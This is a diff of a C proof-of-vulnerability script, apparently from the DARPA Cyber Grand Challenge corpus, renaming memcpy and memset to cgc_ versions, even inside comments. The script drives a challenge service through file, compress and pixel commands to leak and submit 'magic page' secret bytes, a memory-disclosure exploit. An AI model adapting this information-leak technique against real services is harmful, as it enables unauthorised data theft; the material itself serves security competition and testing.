@@ -106,7 +106,7 @@ int CheckMatch(char *response, char *match, int length)
   return 0;
 }
 
-void *memcpy( void *pDest, const void *pSource, size_t nbytes )
+void *cgc_memcpy( void *pDest, const void *pSource, size_t nbytes )
 {
   void *pDestReturn = pDest;
 
@@ -144,7 +144,7 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // Select NEW_FILE
-  memcpy(buffer, "\x01", 1);
+  cgc_memcpy(buffer, "\x01", 1);
   SendToCB(buffer, 1);
 
   // NEW_FILE selected message
@@ -152,10 +152,10 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // padding data
-  memcpy(buffer, "\xc0\xc0", 2);
+  cgc_memcpy(buffer, "\xc0\xc0", 2);
   SendToCB(buffer, 2);
 
-  // flip the magic page bytes so it can be read properly
+  // flip the magic page bytes so it can be cgc_read properly
   uint32_t addr1 = (uint16_t)(t2vals.region_addr<<16 | t2vals.region_addr>>16);
   uint32_t addr2 = (uint16_t)(t2vals.region_addr<<0 | t2vals.region_addr>>0);
 
@@ -171,31 +171,31 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // send Compress command
-  memcpy(buffer, "\x07", 1);
+  cgc_memcpy(buffer, "\x07", 1);
   SendToCB(buffer, 1);
 
   // COMPRESS selected message
   read_string(buffer, 256, '\n');
 
   // send Decompress command
-  memcpy(buffer, "\x08", 1);
+  cgc_memcpy(buffer, "\x08", 1);
   SendToCB(buffer, 1);
 
   // DECOMPRESS selected message
   read_string(buffer, 256, '\n');
 
   // send SHOW_PIXEL command
-  memcpy(buffer, "\x09", 1);
+  cgc_memcpy(buffer, "\x09", 1);
   SendToCB(buffer, 1);
 
-  memset(buffer, 0, 256);
+  cgc_memset(buffer, 0, 256);
 
   // SHOW_PIXEL selected
   read_string(buffer, 256, '\n');
   // Pixel selection prompt
   read_string(buffer, 256, '\n');
 
-  memcpy(buffer, "\x02\x02", 2);
+  cgc_memcpy(buffer, "\x02\x02", 2);
   SendToCB(buffer, 2);
   //transmit(2, buffer, 64, &rxSize);
 
@@ -213,8 +213,8 @@ int main(void) {
   int secret1, secret2;
   char val1[5];
   char val2[5];
-  memcpy(val1, buffer+8, 4);
-  memcpy(val2, buffer+12, 4);
+  cgc_memcpy(val1, buffer+8, 4);
+  cgc_memcpy(val2, buffer+12, 4);
 
   secret1 = (int)strtol(val1, &end, 16);
   secret2 = (int)strtol(val2, &end, 16);
@@ -223,16 +223,16 @@ int main(void) {
   secret2 = (secret2>>8) | (secret2<<8);
 
   unsigned char secret[4];
-  memcpy(secret, &secret1, 2);
-  memcpy(secret+2, &secret2, 2);
+  cgc_memcpy(secret, &secret1, 2);
+  cgc_memcpy(secret+2, &secret2, 2);
 
   // new line
   read_string(buffer, 256, '\n');
 
-  memcpy(buffer, "\x0b", 1);
+  cgc_memcpy(buffer, "\x0b", 1);
   SendToCB(buffer, 1);
 
-  // exit
+  // cgc_exit
   read_string(buffer, 256, '\n');
 
   // submit the secret
